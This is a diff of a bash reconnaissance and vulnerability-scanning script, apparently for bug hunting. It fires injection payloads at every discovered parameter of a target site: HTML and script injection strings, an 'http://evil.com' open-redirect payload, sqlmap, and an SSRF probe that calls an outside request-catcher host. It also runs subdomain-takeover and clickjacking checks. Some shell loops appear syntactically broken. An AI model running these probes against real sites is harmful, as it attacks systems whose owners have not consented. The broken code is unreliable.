@@ -19,23 +19,9 @@ fi
 if [ ! -d "$url/recon/xss" ]; then
           mkdir $url/recon/dq
 fi
-
-if [ ! -f "$url/recon/xss/kxss.txt" ]; then
-          touch $url/recon/dq/kxss.txt
-fi
-
-if [ ! -f "$url/recon/xss/bashxss.txt" ]; then
-          touch $url/recon/dq/bashxss.txt
-fi
-
-if [ ! -f "$url/recon/xss/Gxss.txt" ]; then
-          touch $url/recon/dq/Gxss.txt
-fi
-
-if [ ! -f "$url/recon/xss/dalfox.txt" ]; then
-          touch $url/recon/dq/dalfox.txt
-fi
-
+#---------------------------------------------------------------------------------
+#-----------------------------Finding SubDomains----------------------------------
+#----------------------------------------------------------------------------------
 figlet "TheLionRecon" | lolcat
 echo "                 @Abbas Cyber Security    " | lolcat
 echo "[+]Enumurating SubDomains Using Assetfinder..."
@@ -69,10 +55,14 @@ rm $url/recon/final.txt
 
 echo "[+]Total Unique SubDomains"
 cat $url/recon/fsubs.txt | wc -l
-
-#echo "[+]Testing For SubTakeOver"
-#subzy --targets  $url/recon/fsubs.txt  --timeout 200  --hide_fails > $url/recon/subtake.txt
-
+#--------------------------------------------------------------------------------------------------
+#-------------------------------Checking For SubDomain TakeOver------------------------------------
+#--------------------------------------------------------------------------------------------------
+echo "[+]Testing For SubTakeOver"
+subzy --targets  $url/recon/fsubs.txt  --timeout 200  --hide_fails > $url/recon/subtake.txt
+#--------------------------------------------------------------------------------------------------
+#-----------------------------------Enumurating Parameters-----------------------------------------
+#--------------------------------------------------------------------------------------------------
 
 
 echo "[+]Enumurating Params From Paramspider...."
@@ -91,38 +81,31 @@ rm $url/recon/params.txt
 
 echo "[+]Total Unique Params Found"
 cat $url/recon/fparams.txt | wc -l
-
-
+#--------------------------------------------------------------------------------------------------
+#-------------------------------Checking For HTMLi && RXSS-----------------------------------------
+#--------------------------------------------------------------------------------------------------
 echo "[+]Testing For HTML Injection"
 cat $url/recon/fparams.txt | qsreplace '"><u>hyper</u>' | tee $url/recon/temp.txt && cat $url/recon/temp.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<u>hyper</u>" && echo "$host \033[0;31mVulnearble\n"; done > $url/recon/dq/htmli.txt
-
-#echo "[+]Testing For Openredirects"
-#cat $url/recon/fparams.txt | qsreplace 'http://evil.com' | while read host do ; do curl -s -L $host -I | grep "evil.com" && echo "$host" ;done > $url/recon/open.txt
-
-
-
-#echo "[+]Checking with kxss"
-#cat $url/recon/fparams.txt | kxss > $1/recon/dq/kxss.txt
-
-#echo "[+]Checking with bash xss"
-#cat $url/recon/fparams.txt | qsreplace '"><script>confirm(4)</script>' | tee nooob.txt && cat nooob.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(4)" && echo "$host \033[0;31mVulnearble\n"; done > $url/recon/dq/bashxss.txt
-
-#echo "[+]Checking with reflecting payload using Gxss"
-#cat $1/recon/fparams.txt | Gxss -p dulquer > $url/recon/dq/Gxss.txt 
-
-#echo "[+]Checking with dalfox"
-# dalfox file $url/recon/dq/Gxss.txt  -o $1/recon/xss/dq/xssdalfox.txt
-
-#echo "[+]Removing"
-#rm nooob.txt 
-#rm nooob1.txt
-#rm $url/recon/finalsubs.txt
-
-#echo "[+]Testing For Sqli"
-#cat $url/recon/fparams.txt | python3 /opt/Sqlmap/sqlmap.py 
-
-#echo "[+] Please Check kxss , dalfox , bashxss folders"
-
-
+#--------------------------------------------------------------------------------------------------
+#-------------------------------Checking For Open Redirects----------------------------------------
+#--------------------------------------------------------------------------------------------------
+echo "[+]Testing For Openredirects"
+cat $url/recon/fparams.txt | qsreplace 'http://evil.com' | while read host do ; do curl -s -L $host -I | grep "evil.com" && echo "$host" ;done > $url/recon/open.txt
+#--------------------------------------------------------------------------------------------------
+#---------------------------Checking For Sql Injection Vulnerability-------------------------------
+#--------------------------------------------------------------------------------------------------
+echo "[+]Testing For Sqli"
+cat $url/recon/fparams.txt | python3 /opt/Sqlmap/sqlmap.py 
+#--------------------------------------------------------------------------------------------------
+#-----------------------------------Checking For SSRF----------------------------------------------
+#--------------------------------------------------------------------------------------------------
+cat $url/recon/fparams.txt | qsreplace "https://noor.requestcatcher.com/test" | tee $url/recon/ssrftest.txt && cat $url/recon/ssrftest.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "request caught" && echo "$host \033[0;31mVulnearble\n"; done >> $url/recon/eSSRF.txt
+#--------------------------------------------------------------------------------------------------
+#-----------------------------------Checking For Clickjacking--------------------------------------
+#--------------------------------------------------------------------------------------------------
+cat $url/recon/fsubs.txt | while read host do ; do curl -I -L --silent --path-as-is --insecure "$host" | grep -qs "x-frame-options" && echo "$host \033[0;31mNot\n" || echo  "$host  \033[0;31mVulnerable" ; done | grep Vulnerable >> $url/recon/clickjack.txt
+#-----------------------------------------------------------------------------------------------------------
+#-----------------------------------Checking For Open Redirect in Header--------------------------------------
+#------------------------------------------------------------------------------------------------------------
 
 
